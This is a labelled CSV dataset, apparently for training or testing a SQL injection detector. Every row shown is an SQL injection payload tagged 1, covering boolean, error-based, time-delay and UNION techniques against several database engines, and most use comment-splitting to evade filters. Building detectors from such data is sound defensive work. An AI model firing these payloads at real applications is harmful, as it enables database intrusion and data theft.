Query,Label
"selec/**/t l/**/ike  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )    an/**/d    (    (   'nimx'  =  'nimx",1
"1'||  (  sel/**/ect 'kojx' fr/**/om dual wh/**/ere 8140  =  8140 a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
sel/**/ect   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  sel/**/ect 2161 fro/**/m mysql.db  )   end  )  #,1
"-9854  )   o/**/r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd   (  5696  =  5696",1
1'   )    )    as kahn w/**/here 1361  =  1361 o/**/r   (  sel/**/ect * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  sddo  )  #,1
"1' u/**/nion all se/**/lect nul/**/l,nul/**/l,nul/**/l,nu/**/ll--",1
"-3596'  )   u/**/nion all sel/**/ect 5349,5349,5349,5349,5349,5349#",1
"1%'   )    )     )   o/**/r row  (  1045,7562  )  >  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om   (  se/**/lect 8488 un/**/ion sel/**/ect 5584 u/**/nion s/**/elect 3051 u/**/nion sele/**/ct 1210  )  a group b/**/y x  )   a/**/nd    (    (     (  '%'  =  '",1
"1""   )    )    as uaxn wh/**/ere 5657  =  5657 rlik/**/e   (  selec/**/t   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1
"-4670""   )    )    o/**/r 3038  =  3038",1
"s/**/elect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3-- ampw",1
"1' i/**/n boolean mode  )   o/**/r 8421  =    (  sele/**/ct count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   #",1
1'  )   wh/**/ere 2753  =  2753 an/**/d   (  2739  =  8047  )  *8047--,1
1'+  (  sele/**/ct 'ljtl' whe/**/re 1766  =  1766,1
-3921'  )   as audo w/**/here 7087  =  7087 o/**/r 1755  =  4937--,1
"-2072""  )   as rjcz wh/**/ere 2491  =  2491 o/**/r 6872  =  6872--",1
1'  )   as llug whe/**/re 2244  =  2244 a/**/nd 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1'   )    )    o/**/r 6979  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
-7187' o/**/r 4159  =  7465,1
"1' o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    a/**/nd 'ytlf'  =  'ytlf",1
"1""  )   o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    an/**/d   (  ""cdnc"" l/**/ike ""cdnc",1
sel/**/ect   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  selec/**/t 0  )   end  )  --,1
"sele/**/ct li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    a/**/nd   (  'dthp'  =  'dthp",1
"1"" an/**/d   (  se/**/lect 2*  (  if   (    (   sel/**/ect * f/**/rom   (  se/**/lect concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d ""tfok"" li/**/ke ""tfok",1
1'  )   wher/**/e 6622  =  6622 o/**/rde/**/r b/**/y 1--,1
"1' an/**/d exp  (  ~  (  s/**/elect * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd 'kwhs' lik/**/e 'kwhs",1
"1' o/**/r 4411  =    (  s/**/elect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d 'rhzy'  =  'rhzy",1
"1'+  (  selec/**/t 'yzxc' wher/**/e 5230  =  5230   (  selec/**/t   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f/**/rom   (  v/**/alues  (  0   )    )      )    )   +'",1
"1'+  (  sele/**/ct 'sbvh' wh/**/ere 8539  =  8539 a/**/nd 3707  =    (  s/**/elect count  (  *  )   f/**/rom sysibm.syst/**/ables as t1,sysibm.systabl/**/es as t2,sysibm.systa/**/bles as t3   )    )   +'",1
"-7813""   )    )    as yvyl wher/**/e 5172  =  5172 uni/**/on all sele/**/ct 5172,5172#",1
1'||  (  s/**/elect 'uiyj' fro/**/m dual wh/**/ere 8320  =  8320,1
sele/**/ct   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  s/**/elect 0  )   end  )  --,1
"sel/**/ect count  (  *  )   f/**/rom generate_series  (  1,5000000  )   a/**/nd ""xcjt""  =  ""xcjt",1
"1 wher/**/e 1096  =  1096 an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"-9011""   )    )    o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  sel/**/ect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
1'   )    )    as plbt w/**/here 4368  =  4368 a/**/nd 3754  =    (  s/**/elect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f/**/rom dual  )  --,1
"1  )   an/**/d 6414  =    (  sele/**/ct count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
"1""  )   an/**/d 5556  =    (  se/**/lect count  (  *  )   fr/**/om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a/**/nd   (  ""dppw"" lik/**/e ""dppw",1
1'||  (  se/**/lect 'zyvk' fro/**/m dual wher/**/e 2072  =  2072,1
-5918'  )   as olzc whe/**/re 5992  =  5992 o/**/r 4390  =  9085,1
"-9795  )   as wrgs wh/**/ere 5427  =  5427 u/**/nion all se/**/lect 5427,5427,5427,5427,5427,5427--",1
1' w/**/here 6913  =  6913 an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-5243"" whe/**/re 2105  =  2105 o/**/r 4144  =    (  selec/**/t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr/**/om dual  )  --",1
-6637'   )    )    o/**/r/**/der b/**/y 1#,1
"sel/**/ect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fr/**/om dual an/**/d ""ulfr"" l/**/ike ""ulfr",1
"1'+  (  selec/**/t 'rryx' wher/**/e 1228  =  1228 unio/**/n all sel/**/ect nul/**/l,nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,n/**/ull#",1
"1'   )    )    o/**/r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1  )   an/**/d 6240  =    (  'qqpjq'||  (  s/**/elect case 6240 when 6240 then 1 else 0 end fro/**/m rdb$da/**/tabase  )  ||'qzvzq'  )   an/**/d   (  3945  =  3945,1
"1  )   as biup wher/**/e 1414  =  1414 un/**/ion all se/**/lect nul/**/l,nul/**/l,nu/**/ll,nul/**/l,nul/**/l,n/**/ull,n/**/ull,nu/**/ll#",1
"-5827""  )   as lskq whe/**/re 7683  =  7683 uni/**/on all selec/**/t 7683,7683,7683,7683,7683#",1
"sel/**/ect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fro/**/m dual  )  ||'",1
"-3697'   )    )     )   un/**/ion all sele/**/ct 5180,5180,5180,5180,5180,5180,5180--",1
"1""  )   w/**/here 7010  =  7010 a/**/nd 9660  =    (  sel/**/ect count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'   )    )     )   an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a/**/nd    (    (     (  'smrw' l/**/ike 'smrw,1
1' a/**/nd 5967  =  4184#,1
1'||  (  sele/**/ct 'cclo' f/**/rom dual whe/**/re 6823  =  6823 a/**/nd 9198  =  9198--,1
1' wh/**/ere 7191  =  7191 rl/**/ike sleep  (  5  )  --,1
"1'   )    )    an/**/d make_se/**/t  (  8245  =  9872,9872  )   a/**/nd    (    (   'kzgt'  =  'kzgt",1
"1' an/**/d   (  selec/**/t 2*  (  if   (    (   sele/**/ct * fro/**/m   (  selec/**/t concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d 'wjwn'  =  'wjwn",1
"1'   )    )    o/**/r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )   a/**/nd    (    (   'acly' li/**/ke 'acly",1
"1""  )   wher/**/e 1330  =  1330 o/**/r   (  se/**/lect * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  ydpu  )  --",1
"1  )   w/**/here 7199  =  7199 an/**/d 8407  =    (  sele/**/ct count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"1%""   )    )    a/**/nd 3707  =    (  se/**/lect count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.systa/**/bles as t2,sysibm.systab/**/les as t3  )   an/**/d    (    (   ""%""  =  """,1
"-9514   )    )    as xdkw wh/**/ere 4975  =  4975 unio/**/n all sel/**/ect 4975,4975,4975,4975#",1
"1 u/**/nion all selec/**/t n/**/ull,nu/**/ll#",1
"1 a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  -- kfqs",1
"1'||  (  s/**/elect 'wyng' fr/**/om dual wher/**/e 2157  =  2157 uni/**/on all se/**/lect nu/**/ll,nu/**/ll--",1
1'  )   a/**/nd 6240  =    (  'qqpjq'||  (  selec/**/t case 6240 when 6240 then 1 else 0 end f/**/rom rdb$d/**/atabase  )  ||'qzvzq'  )   a/**/nd   (  'vhqm'  =  'vhqm,1
"1'+  (  s/**/elect 'zohk' wher/**/e 5502  =  5502 o/**/r 2367  =    (  sele/**/ct count  (  *  )   fro/**/m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-6865  )   o/**/r   (  8459  =  8459  )  *4906 an/**/d   (  6107  =  6107,1
"1%""   )    )    an/**/d updat/**/exml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   an/**/d    (    (   ""%""  =  """,1
"1'+  (  selec/**/t 'qrml' wher/**/e 3791  =  3791 o/**/r 8384  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )     )  +'",1
1'   )    )    as eymg w/**/here 7000  =  7000,1
"1%'   )    )     )   an/**/d u/**/pdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   an/**/d    (    (     (  '%'  =  '",1
"1%""   )    )     )   o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"-1065   )    )    u/**/nion all se/**/lect 7437,7437,7437,7437,7437,7437,7437,7437--",1
-1603'   )    )    o/**/r 5903  =    (  'qqpjq'||  (  sele/**/ct case 5903 when 5903 then 1 else 0 end fro/**/m rdb$d/**/atabase  )  ||'qzvzq'  )   an/**/d    (    (   'abmo'  =  'abmo,1
"1',  (  selec/**/t   (  case when   (  2106  =  2106  )   then   (  sel/**/ect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  se/**/lect 2106 f/**/rom master..sysdatab/**/ases  )   end   )    )   ",1
"1%"" a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1 wher/**/e 7051  =  7051 o/**/r 4411  =    (  sel/**/ect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   whe/**/re 6672  =  6672 un/**/ion all se/**/lect n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,n/**/ull,n/**/ull,n/**/ull,nul/**/l,n/**/ull--",1
-3899'  )   w/**/here 8152  =  8152 o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1""  )   an/**/d   (  3020  =  3020  )  *6703 an/**/d   (  ""hkjf""  =  ""hkjf",1
"1%""   )    )     )   an/**/d 7533  =  7533 an/**/d    (    (     (  ""%""  =  """,1
"1%""  )   a/**/nd   (  6016  =  4763  )  *4763 an/**/d   (  ""%""  =  """,1
"1""   )    )     )   o/**/r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nu/**/ll  )   an/**/d    (    (   ""%""  =  """,1
"-3391' unio/**/n all sele/**/ct 2024,2024--",1
"1%' o/**/r 8384  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d '%'  =  '",1
"-3829%""  )   unio/**/n all se/**/lect 2218,2218,2218,2218,2218,2218,2218--",1
"-8629 w/**/here 8049  =  8049 unio/**/n all se/**/lect 8049,8049,8049,8049,8049,8049,8049#",1
"-3279"" unio/**/n all sel/**/ect 8568,8568,8568,8568--",1
"1"" o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1%'   )    )     )   a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1%'   )    )    a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'  )   rlik/**/e sleep  (  5  )  #,1
-3598  )   unio/**/n all s/**/elect 2264#,1
s/**/elect   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  sel/**/ect 9455 fro/**/m mysql.db  )   end  )  #,1
"-8982' i/**/n boolean mode  )   uni/**/on all sele/**/ct 5367,5367,5367,5367,5367,5367#",1
1'  )   an/**/d 9198  =  9198--,1
"1""  )   whe/**/re 6897  =  6897",1
"1"" wher/**/e 7739  =  7739 a/**/nd sleep  (  5  )  --",1
"1' w/**/here 5702  =  5702 an/**/d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1""   )    )    a/**/nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   a/**/nd    (    (   ""nbfe""  =  ""nbfe",1
"1""   )    )    as osuh whe/**/re 8809  =  8809",1
"1'||  (  se/**/lect 'ftey' wh/**/ere 1363  =  1363 an/**/d   (  sele/**/ct 2*  (  if   (    (   sele/**/ct * fr/**/om   (  selec/**/t concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1
"1' w/**/here 7104  =  7104 u/**/nion all selec/**/t n/**/ull,nu/**/ll,n/**/ull,nul/**/l,n/**/ull,nu/**/ll,nul/**/l#",1
1%' o/**/r/**/der b/**/y 1#,1
"1""   )    )    o/**/r exp  (  ~  (  se/**/lect * f/**/rom   (  sel/**/ect concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd    (    (   ""nwzu"" l/**/ike ""nwzu",1
s/**/elect   (  case when   (  6961  =  7460  )   then 1 else 6961*  (  s/**/elect 6961 fro/**/m master..sysdat/**/abases  )   end  )  --,1
sele/**/ct   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  selec/**/t 0  )   end  )  --,1
"1%""  )   o/**/r 4240  =    (  sele/**/ct 4240 fr/**/om pg_sleep  (  5   )    )   --",1
-5137  )   o/**/r 9323  =  9323#,1
"-1184""   )    )     )   un/**/ion all sel/**/ect 1482--",1
"-6158""  )   uni/**/on all s/**/elect 3084,3084,3084,3084,3084,3084#",1
"1""   )    )     )   o/**/r   (  s/**/elect 9173 f/**/rom  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d    (    (     (  ""hkjm"" l/**/ike ""hkjm",1
1  )   as gbtj w/**/here 8175  =  8175,1
"1'   )    )    a/**/nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd    (    (   'mwyu'  =  'mwyu",1
1  )   as li/**/sg wher/**/e 5490  =  5490,1
"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'   )    )     (  selec/**/t   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nu/**/ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f/**/rom   (  value/**/s  (  0   )    )     )   a/**/nd    (    (   'dpdz' l/**/ike 'dpdz",1
 o/**/r '1'   =   '1,1
"1 wh/**/ere 3902  =  3902 o/**/r 9643  =    (  s/**/elect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
"-9859""   )    )     )   uni/**/on all sele/**/ct 6595,6595,6595,6595,6595,6595,6595#",1
"1""  )   as xylo w/**/here 2112  =  2112 a/**/nd 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1' wher/**/e 8749  =  8749 o/**/r 8421  =    (  se/**/lect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   --",1
"1'||  (  sel/**/ect 'oyyu' w/**/here 6765  =  6765 o/**/r updat/**/exml  (  1808,concat  (  0x2e,0x7171706a71,  (  sel/**/ect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1
-3100'  )   o/**/r 4144  =    (  selec/**/t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f/**/rom dual  )   a/**/nd   (  'etuj' li/**/ke 'etuj,1
"-2319 un/**/ion all s/**/elect 5068,5068,5068#",1
"-6095""  )   as hygc wher/**/e 8142  =  8142 o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-9656"" u/**/nion all sele/**/ct 8735,8735--",1
1  )   an/**/d   (  s/**/elect * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  fzno  ) ,1
"1%""   )    )    a/**/nd 8635  =    (  selec/**/t count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"1""   )    )    as rcse whe/**/re 4559  =  4559 an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"1""   )    )    o/**/r exp  (  ~  (  selec/**/t * fr/**/om   (  s/**/elect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd    (    (   ""oxvw""  =  ""oxvw",1
-9840'   )    )    o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d    (    (   'dzlp'  =  'dzlp,1
"1'||  (  sel/**/ect 'svbf' wher/**/e 7017  =  7017 o/**/r elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
-4892%'   )    )    o/**/r 2251  =  9881--,1
"1""  )   a/**/nd 3707  =    (  sel/**/ect count  (  *  )   fro/**/m sysibm.systabl/**/es as t1,sysibm.systa/**/bles as t2,sysibm.systab/**/les as t3  )   an/**/d   (  ""pfea""  =  ""pfea",1
"-5859  )   as ernq wh/**/ere 8394  =  8394 uni/**/on all selec/**/t 8394,8394,8394--",1
"-4076'   )    )    u/**/nion all s/**/elect 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1
-6233'  )   wh/**/ere 9820  =  9820 o/**/r 3038  =  3038,1
"-8950""   )    )    as uahs whe/**/re 2113  =  2113 un/**/ion all selec/**/t 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
"-8209  )   o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  selec/**/t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
-9826 wher/**/e 4103  =  4103 o/**/rde/**/r b/**/y 1#,1
1   )    )    as muyz wher/**/e 6105  =  6105,1
1' a/**/nd 1541  =  6868#,1
1  )   wh/**/ere 1402  =  1402,1
1'||  (  sel/**/ect 'wadx' wh/**/ere 4287  =  4287 o/**/r sleep  (  5  )  #,1
"-3234%""   )    )    o/**/r elt  (  1032  =  1032,3623  )   a/**/nd    (    (   ""%""  =  """,1
"1' un/**/ion all selec/**/t n/**/ull,n/**/ull,nul/**/l--",1
1 wher/**/e 9872  =  9872,1
"-7482%""   )    )    o/**/r 1570  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d    (    (   ""%""  =  """,1
"1'  )   whe/**/re 7587  =  7587 o/**/r 8421  =    (  s/**/elect count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   --",1
"-9295   )    )     )   o/**/r 1570  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d    (    (     (  8752  =  8752",1
"1'  )   as ibqr whe/**/re 5372  =  5372 an/**/d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-9135""   )    )    o/**/r 6872  =  6872 a/**/nd    (    (   ""fllx""  =  ""fllx",1
1%' an/**/d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d '%'  =  ',1
